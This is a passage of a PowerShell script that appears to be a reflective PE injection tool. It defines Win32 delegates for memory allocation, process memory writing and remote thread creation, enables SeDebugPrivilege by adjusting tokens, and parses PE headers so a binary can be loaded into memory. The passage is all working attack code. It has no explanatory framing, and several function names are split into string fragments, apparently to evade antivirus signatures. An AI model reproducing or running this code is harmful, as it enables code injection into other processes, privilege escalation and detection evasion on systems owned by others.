        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        return $Win32Constants
    }
    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name $('Vi'+'rt'+'ual'+'Pro'+'te'+'ct') -Value $VirtualProtect
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType $('No'+'te'+'Pr'+'op'+'er'+'ty') -Name $('Wr'+'ite'+'Proc'+'ess'+'Mem'+'or'+'y') -Value $WriteProcessMemory
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        $LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $LocalFreeDelegate = Get-DelegateType @([IntPtr])
        $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree
        return $Win32Functions
    }
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                [UInt16]$Sum = $Val - $Value2Bytes[$i]
                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
                $FinalBytes[$i] = $Sum -band 0x00FF
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        return $false
    }
    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $FirstAddress,
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($FirstAddress) ($Size))
        $PEEndAddress = $PEInfo.EndAddress
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($FirstAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('Re'+'fl'+'ect'+'edD'+'ele'+'gat'+'e')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        Write-Output $TypeBuilder.CreateType()
    }
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }
        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    Function Invoke-CreateRemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcHandle,
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $FirstAddress,
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        $OSVersion = [Environment]::OSVersion.Version
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $FirstAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcHandle, $FirstAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $FirstAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $FirstAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }
        return $RemoteThreadHandle
    }
    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        $NtHeadersInfo = New-Object System.Object
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        return $NtHeadersInfo
    }
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PortableExecutableBytes,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        $PEInfo = New-Object System.Object
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PortableExecutableBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PortableExecutableBytes, 0, $UnmanagedPEBytes, $PortableExecutableBytes.Length) | Out-Null
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        return $PEInfo
    }
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        $PEInfo = New-Object System.Object
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        if ($PEInfo.PE64Bit -eq $true)
        {
